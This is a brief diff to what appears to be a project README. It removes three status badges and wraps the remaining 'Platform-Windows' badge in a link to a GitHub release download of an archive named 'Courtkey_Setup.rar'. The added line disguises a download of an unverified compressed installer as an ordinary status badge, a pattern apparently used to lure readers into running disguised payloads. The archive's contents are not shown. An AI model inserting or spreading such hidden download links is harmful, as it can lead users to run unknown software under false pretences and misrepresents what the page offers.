@@ -5,9 +5,7 @@
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/Platform-Windows-blue" alt="Platform">
-  <img src="https://img.shields.io/badge/Layout-Remington%20Gail-orange" alt="Layout">
-  <img src="https://img.shields.io/badge/Marking-50%20Marks%20System-success" alt="Marking System">
+  <a href='https://github.com/wedugo/Courtkey-Software/releases/download/1.0/Courtkey_Setup.rar'><img src="https://img.shields.io/badge/Platform-Windows-blue" alt="Platform"></a>
 </p>
 
 ---
